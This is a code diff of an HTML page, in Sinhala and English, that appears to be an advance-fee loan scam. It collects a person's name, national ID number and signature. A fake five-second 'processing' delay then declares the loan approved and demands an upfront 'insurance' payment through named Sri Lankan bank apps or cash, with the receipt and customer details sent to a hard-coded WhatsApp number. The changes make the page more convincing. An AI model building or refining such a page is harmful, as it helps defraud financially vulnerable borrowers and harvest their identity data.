@@ -54,8 +54,14 @@ button{
 .pay-btn{background:#2980b9;}
 .whatsapp-btn{background:#25D366;}
 .help-btn{background:#7f8c8d;}
-.option-btn{background:#34495e;}
-.option-btn.active{background:#27ae60;}
+
+.option-btn{background:#34495e}
+
+/* Bank colors */
+.bank-sampath{background:#8e44ad;}
+.bank-boc{background:#2980b9;}
+.bank-commercial{background:#2c3e50;}
+.bank-nsb{background:#27ae60;}
 
 canvas{
     width:100%;
@@ -75,6 +81,9 @@ canvas{
     line-height:1.5;
 }
 
+#page2,#page3{display:none;}
+
+/* LOADING */
 #loading{
     position:fixed;
     inset:0;
@@ -95,11 +104,9 @@ canvas{
     animation:spin 1s linear infinite;
     margin-bottom:20px;
 }
-
 @keyframes spin{100%{transform:rotate(360deg);}}
 
-#page2,#page3{display:none;}
-
+/* POPUP */
 #popup{
     position:fixed;
     inset:0;
@@ -112,12 +119,7 @@ canvas{
     transition:.25s;
     z-index:1000;
 }
-
-#popup.active{
-    opacity:1;
-    pointer-events:auto;
-}
-
+#popup.active{opacity:1;pointer-events:auto;}
 .popup-box{
     background:#fff;
     padding:20px;
@@ -130,6 +132,12 @@ canvas{
 </head>
 
 <body>
+
+<div id="loading">
+ <div class="spinner"></div>
+ <div>Loading...</div>
+</div>
+
 <div class="app">
 
 <!-- PAGE 1 -->
@@ -161,14 +169,9 @@ canvas{
 <h3>Loan Approved</h3>
 
 <p><b>Customer ID:</b> <span id="customerId"></span></p>
+<p><b>Name:</b> <span id="showName"></span></p>
 <p><b>Requested Amount:</b> Rs. <span id="showAmount"></span></p>
 <p><b>Insurance Payment:</b> Rs. <span id="insurance"></span></p>
-
-<div class="statement">
-ඔබ ලබාගන්නා ණය මුදල අනුමත වී ඇත.<br><br>
-රක්ෂණ මුදල ගෙවා පැයක් ඇතුළත මුදල් බැර කෙරේ.<br><br>
-රිසිට් පත WhatsApp හරහා එවනු ලැබේ.
-</div>
 
 <label>Upload Receipt</label>
 <input type="file" id="receipt" accept="image/*">
@@ -177,20 +180,23 @@ canvas{
 
 <button class="pay-btn" onclick="goPayment()">Pay Now</button>
 
+<button class="whatsapp-btn" onclick="sendPage2WhatsApp()">WhatsApp Message</button>
 </div>
 
 <!-- PAGE 3 -->
 <div class="page" id="page3">
 <h3>ඔබ ගෙවීම කරන්නෙ කොහොමද?</h3>
 
-<button class="option-btn" onclick="selectType('Online')">Online හරහා ගෙවීම</button>
-<button class="option-btn" onclick="selectType('Cash')">Cash payment (පිටතින්)</button>
+<div id="payTypeBtns">
+<button class="option-btn" onclick="selectType('Online')">Online Transfer</button>
+<button class="option-btn" onclick="selectType('Cash')">Cash Payment</button>
+</div>
 
 <div id="onlineOptions" style="display:none">
-<button class="option-btn" onclick="selectMethod('Sampath Vishwa')">Sampath Vishwa</button>
-<button class="option-btn" onclick="selectMethod('BOC Flex')">BOC Flex</button>
-<button class="option-btn" onclick="selectMethod('Commercial App')">Commercial App</button>
-<button class="option-btn" onclick="selectMethod('NSB Pay')">NSB Pay</button>
+<button class="bank-sampath" onclick="selectMethod('Sampath Vishwa')">Sampath Vishwa</button>
+<button class="bank-boc" onclick="selectMethod('BOC Flex')">BOC Flex</button>
+<button class="bank-commercial" onclick="selectMethod('Commercial App')">Commercial App</button>
+<button class="bank-nsb" onclick="selectMethod('NSB Pay')">NSB Pay</button>
 </div>
 
 <div id="cashOptions" style="display:none">
@@ -218,9 +224,7 @@ canvas{
 <script>
 const WHATSAPP_NO="94742089009";
 
-let AUTO_CUSTOMER_ID="";
-let paymentType="";
-let paymentMethod="";
+let AUTO_CUSTOMER_ID="",paymentType="",paymentMethod="";
 
 /* POPUP */
 const popup=document.getElementById("popup");
@@ -232,73 +236,57 @@ function showPopup(msg){
 
 /* CUSTOMER ID */
 function generateCustomerId(){
- const d=new Date();
- return `EZC-${d.getTime()}`;
+ return "EZC-"+Date.now();
 }
 
 /* INSURANCE */
-function calculateInsurance(amount){
- amount=parseInt(amount);
- if(amount<=30000) return 2000;
- if(amount<=40000) return 2500;
- if(amount<=50000) return 3000;
- if(amount<=100000) return 3500;
- if(amount<=200000) return 4000;
- if(amount<=300000) return 4000;
- if(amount<=400000) return 5000;
+function calculateInsurance(a){
+ a=parseInt(a);
+ if(a<=30000)return 2000;
+ if(a<=40000)return 2500;
+ if(a<=50000)return 3000;
+ if(a<=100000)return 3500;
+ if(a<=200000)return 4000;
+ if(a<=300000)return 4000;
+ if(a<=400000)return 5000;
  return 5500;
 }
 
 /* SIGNATURE */
 const c=document.getElementById("sign");
 const ctx=c.getContext("2d");
-ctx.lineWidth=3;
-ctx.lineCap="round";
-
-let drawing=false;
-c.addEventListener("pointerdown",e=>{drawing=true;ctx.beginPath();ctx.moveTo(e.offsetX,e.offsetY)});
-c.addEventListener("pointermove",e=>{if(!drawing)return;ctx.lineTo(e.offsetX,e.offsetY);ctx.stroke();});
-c.addEventListener("pointerup",()=>drawing=false);
-c.addEventListener("pointerleave",()=>drawing=false);
-
-function clearSign(){
- ctx.clearRect(0,0,c.width,c.height);
-}
+let draw=false;
+c.onpointerdown=e=>{draw=true;ctx.beginPath();ctx.moveTo(e.offsetX,e.offsetY)}
+c.onpointermove=e=>{if(draw){ctx.lineTo(e.offsetX,e.offsetY);ctx.stroke()}}
+c.onpointerup=()=>draw=false;
+function clearSign(){ctx.clearRect(0,0,c.width,c.height)}
 
 /* PAGE FLOW */
-const page1=document.getElementById("page1");
-const page2=document.getElementById("page2");
-const page3=document.getElementById("page3");
-const name=document.getElementById("name");
-const nic=document.getElementById("nic");
-const amount=document.getElementById("amount");
-const customerId=document.getElementById("customerId");
-const showAmount=document.getElementById("showAmount");
-const insurance=document.getElementById("insurance");
-const receipt=document.getElementById("receipt");
-const onlineOptions=document.getElementById("onlineOptions");
-const cashOptions=document.getElementById("cashOptions");
-
 function goNext(){
- if(!name.value || !nic.value || !amount.value){
-  showPopup("කරුණාකර සියලු fields පුරවන්න");
-  return;
+ if(!name.value||!nic.value||!amount.value){
+  showPopup("කරුණාකර සියලු fields පුරවන්න");return;
  }
- AUTO_CUSTOMER_ID = generateCustomerId();
- customerId.innerText = AUTO_CUSTOMER_ID;
- showAmount.innerText = amount.value;
- insurance.innerText = calculateInsurance(amount.value);
 
- page1.style.display="none";
- page2.style.display="block";
+ loading.style.display="flex";
+
+ setTimeout(()=>{
+  loading.style.display="none";
+  AUTO_CUSTOMER_ID=generateCustomerId();
+  customerId.innerText=AUTO_CUSTOMER_ID;
+  showName.innerText=name.value;
+  showAmount.innerText=amount.value;
+  insurance.innerText=calculateInsurance(amount.value);
+
+  page1.style.display="none";
+  page2.style.display="block";
+ },5000);
 }
 
 function submitForm(){
- if(receipt.files.length===0){
-  showPopup("කරුණාකර receipt upload කරන්න");
-  return;
+ if(!receipt.files.length){
+  showPopup("Receipt upload කරන්න");return;
  }
- showPopup("Receipt uploaded successfully. WhatsApp click කරන්න.");
+ showPopup("Receipt uploaded successfully");
 }
 
 function goPayment(){
@@ -306,22 +294,30 @@ function goPayment(){
  page3.style.display="block";
 }
 
-/* PAYMENT PAGE */
-function selectType(type){
- paymentType=type;
- paymentMethod="";
- onlineOptions.style.display = (type==="Online")?"block":"none";
- cashOptions.style.display = (type==="Cash")?"block":"none";
+/* PAGE 2 WHATSAPP */
+function sendPage2WhatsApp(){
+ const msg=`Customer Details ✅
+Customer ID: ${AUTO_CUSTOMER_ID}
+Name: ${name.value}
+Amount: Rs.${showAmount.innerText}
+Insurance: Rs.${insurance.innerText}`;
+ window.open(`https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`);
 }
 
-function selectMethod(method){
- paymentMethod=method;
+/* PAYMENT PAGE */
+function selectType(t){
+ paymentType=t;
+ paymentMethod="";
+ payTypeBtns.style.display="none";
+ onlineOptions.style.display=(t==="Online")?"block":"none";
+ cashOptions.style.display=(t==="Cash")?"block":"none";
 }
+
+function selectMethod(m){paymentMethod=m;}
 
 function confirmPayment(){
- if(!paymentType || !paymentMethod){
-  showPopup("කරුණාකර Payment method එක select කරන්න");
-  return;
+ if(!paymentMethod){
+  showPopup("Payment method select කරන්න");return;
  }
  const msg=`Payment Details ✅
 Customer ID: ${AUTO_CUSTOMER_ID}
@@ -332,7 +328,7 @@ Insurance: Rs.${insurance.innerText}`;
  window.open(`https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`);
 }
 
-/* HELP BUTTON */
+/* HELP */
 function sendHelp(){
  const msg="ගෙවීම කරන විදිය පැහැදිලි නැහැ. කරුණාකර උදව් කරන්න.";
  window.open(`https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`);
